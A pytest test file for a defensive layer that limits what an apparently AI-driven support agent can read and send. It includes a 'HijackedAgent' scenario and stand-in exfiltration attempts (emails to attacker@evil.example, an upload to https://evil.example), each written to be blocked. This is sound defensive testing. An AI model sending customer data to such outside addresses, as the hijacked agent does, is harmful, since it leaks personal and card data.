import json

import pytest

from demo.__main__ import POLICY, make_vault, run
from demo.agents import HijackedAgent, LegitAgent
from demo.world import ATTACKER, World
from taskvault import AuditLog, Blocked, Policy, PolicyError, Vault


@pytest.fixture
def world():
    return World()


@pytest.fixture
def task(world):
    return make_vault(world).start_task("support_reply", customer_id=12)


# ---- reads -----------------------------------------------------------------

def test_scoped_read_returns_only_allowed_fields(task):
    c = task.read("crm.customer")
    assert set(c) == {"name", "email", "plan", "card_number"}   # no phone or address


def test_secrets_reach_the_model_only_as_placeholders(task, world):
    c = task.read("crm.customer", 12)
    assert c["card_number"].startswith("[[vault:card_number:")
    assert world.customers[12]["card_number"] not in json.dumps(c)


@pytest.mark.parametrize("source,key", [("crm.customer", 45), ("crm.customer", "*"), ("docs", "pricing_sheet")])
def test_reads_outside_task_scope_are_blocked(task, source, key):
    with pytest.raises(Blocked, match="outside this task's scope"):
        task.read(source, key)


def test_task_needs_its_trusted_inputs(world):
    with pytest.raises(ValueError, match="trusted inputs"):
        make_vault(world).start_task("support_reply")


# ---- actions ---------------------------------------------------------------

def test_legit_refund_and_reply_work(task, world):
    c = task.read("crm.customer")
    task.act("payments.refund", card=c["card_number"], amount=49.0)
    task.act("email.send", to=c["email"], subject="Refund", body=f"Hi {c['name']}, done.")
    assert world.refunds == [{"card": "4111 1111 1111 1111", "amount": 49.0}]   # real value at the sink
    assert world.outbox[0]["to"] == "priya.shah@example.com"
    assert world.leaks() == []


def test_recipient_from_untrusted_content_is_blocked(task, world):
    c = task.read("crm.customer")
    with pytest.raises(Blocked, match="did not come from trusted data"):
        task.act("email.send", to=ATTACKER, subject="x", body=c["name"])
    assert world.outbox == []


def test_customer_data_cannot_go_to_another_customer(task):
    c = task.read("crm.customer")
    with pytest.raises(Blocked):
        task.act("email.send", to="tom.nguyen@example.net", subject="x", body=c["email"])


def test_secret_cannot_be_emailed_even_to_its_owner(task, world):
    c = task.read("crm.customer")
    with pytest.raises(Blocked, match="may not be sent to 'email.send'"):
        task.act("email.send", to=c["email"], subject="Your card", body=c["card_number"])
    assert world.outbox == []


def test_sink_not_in_template_is_blocked(task):
    with pytest.raises(Blocked, match="unknown sink|not allowed"):
        task.act("files.upload", url="https://evil.example", data="x")


def test_company_data_only_goes_to_internal_domains(world):
    raw = {
        "internal_domains": ["acme.example"],
        "sources": {"docs": {"owner": "company", "key_levels": {"pricing_sheet": "protected"}}},
        "tasks": {"pricing_question": {
            "trusted": [], "reads": {"docs": {"keys": ["pricing_sheet"]}},
            "sinks": {"email.send": {"recipient_arg": "to",
                                     "allowed_recipients": ["sales@acme.example", "buyer@example.com"]}}}},
    }
    vault = Vault(Policy.from_dict(raw), sources={"docs": world.get_doc}, sinks={"email.send": world.send_email})
    t = vault.start_task("pricing_question")
    body = t.read("docs", "pricing_sheet")["body"]
    t.act("email.send", to="sales@acme.example", subject="pricing", body=body)
    with pytest.raises(Blocked, match="owner company"):
        t.act("email.send", to="buyer@example.com", subject="pricing", body=body.splitlines()[0])


# ---- shadow mode, audit, policy -------------------------------------------

def test_shadow_mode_blocks_nothing_but_records_everything(world):
    vault = make_vault(world, mode="shadow")
    t = vault.start_task("support_reply", customer_id=12)
    t.read("crm.customer", 45)
    t.act("email.send", to=ATTACKER, subject="x", body="hello")
    reasons = [e["reason"] for e in vault.audit.decisions("would_block")]
    assert any("outside this task's scope" in r for r in reasons)
    assert any("did not come from trusted data" in r for r in reasons)
    assert len(world.outbox) == 1


def test_audit_log_is_hash_chained_and_holds_no_raw_secrets(task, world, tmp_path):
    c = task.read("crm.customer")
    with pytest.raises(Blocked):
        task.act("email.send", to=ATTACKER, subject="x", body=c["name"])
    log = task.vault.audit
    assert log.verify()
    assert "4111 1111 1111 1111" not in json.dumps(log.entries)
    log.entries[1]["decision"] = "block"          # tamper with one entry
    assert not log.verify()


def test_audit_log_persists_and_reloads(tmp_path):
    path = tmp_path / "audit.jsonl"
    log = AuditLog(path)
    log.record("a", decision="allow")
    log.record("b", decision="block")
    assert AuditLog(path).verify()


def test_policy_rejects_unknown_levels():
    with pytest.raises(PolicyError):
        Policy.from_dict({"sources": {"crm": {"fields": {"email": "top-secret"}}}})


def test_demo_policy_loads():
    assert "support_reply" in Policy.load(POLICY).tasks


# ---- end to end ------------------------------------------------------------

def test_hijacked_agent_leaks_without_vault_and_not_with_it():
    _, world_raw, _ = run(HijackedAgent(), "T-101", use_vault=False)
    _, world_vault, vault = run(HijackedAgent(), "T-101", use_vault=True)
    assert len(world_raw.leaks()) > 10
    assert world_vault.leaks() == [] and world_vault.outbox == []
    assert vault.audit.verify()


def test_legit_agent_is_not_blocked():
    log, world, vault = run(LegitAgent(), "T-100", use_vault=True)
    assert all(outcome == "done" for _, outcome in log)
    assert vault.audit.decisions("block") == []
    assert len(world.refunds) == 1 and len(world.outbox) == 1


def test_logs_and_audit_never_contain_the_blocked_values(caplog):
    """Block reasons go to the log and audit file without addresses, keys or owners;
    the caller still gets the full message."""
    import json
    import logging

    from demo.__main__ import make_vault
    from demo.world import World

    caplog.set_level(logging.INFO, logger="taskvault")
    world = World()
    vault = make_vault(world)
    task = vault.start_task("support_reply", customer_id=12)
    c = task.read("crm.customer")
    with pytest.raises(Blocked, match="attacker@evil.example"):
        task.act("email.send", to="attacker@evil.example", subject="x", body="hello")
    with pytest.raises(Blocked, match="crm.customer:45"):
        task.read("crm.customer", 45)
    with pytest.raises(Blocked):
        task.act("email.send", to="tom.nguyen@example.net", subject="x", body=c["name"])
    written = json.dumps(vault.audit.entries) + " ".join(r.getMessage() for r in caplog.records)
    for value in ["attacker@evil.example", "tom.nguyen@example.net", "crm.customer:45", "customer:12", "Priya"]:
        assert value not in written, value
    assert vault.audit.decisions("block") and caplog.records
